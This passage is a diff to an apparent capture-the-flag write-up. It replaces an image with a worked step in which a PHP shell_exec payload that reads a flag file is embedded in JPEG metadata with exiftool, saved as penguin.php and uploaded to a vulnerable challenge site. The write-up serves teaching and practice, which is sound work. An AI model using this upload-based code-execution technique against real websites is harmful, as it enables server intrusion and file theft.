@@ -44,7 +44,37 @@ We concluded that this challenge website is vulnerable to PHP injection attack. 
 
 Now, inject a super duper simple PHP shell execution payload into the `penguin.php` using `exiftool`.
 
-[[image]]
+```
+$ exiftool -DocumentName='<?php echo shell_exec("cat /home/flag.txt") ?>' > penguin.php
+  1 image files updated
+
+$ exiftool penguin.php
+Exiftool Version Number          : 12.63
+File Name                        : penguin.php
+Directory                        : .
+File Size                        : 3.5 kB
+File Modification Date/Time      : 2023:08:16 04:28:12-04:00
+File Access Date/Time            : 2023:08:16 04:28:12-04:00
+File Inode Change Date/Time      : 2023:08:16 04:28:12-04:00
+File Permissions                 : -rw------
+File Type                        : JPEG
+File Type Extension              : jpg
+MIME Type                        : image/jpeg
+Exif Byte Order                  : Big-endian (Motorola, MM)
+Document Name                    : <?php echo shell_exec("cat /home/flag.txt") ?>
+X Resolution                     : 72
+Y Resolution                     : 72
+Resolution Unit                  : inches
+Y Cb Cr Positioning              : Centered
+Image Width                      : 183
+Image Height                     : 276
+Encoding Process                 : Baseline DCT, Huffman Coding
+Bits Per Sample                  : 8
+Color Components                 : 3
+Y Cb Cr Sub Sampling             : YCbCr4:2:0 (2 2)
+Image Size                       : 183x276
+Megapixels                       : 0.051
+```
 
 {% capture notice-2 %}
 💡 **NOTE**: We tried to inject using `-Note=` and `-Comment=` metadata parameters but it does not give any results. However, we ended up using `-DocumentName=` for the attack and works. In our opinions, we think that any parameters will give the same results just the procedure of modifying the image file is incorrect.
@@ -52,7 +82,7 @@ Now, inject a super duper simple PHP shell execution payload into the `penguin.p
 
 <div class="notice--info">{{ notice-2 | markdownify }}</div>
 
-Upload the file and the flag is revealed.
+Upload the malicious file and the flag is revealed.
 
 [[image]]
 
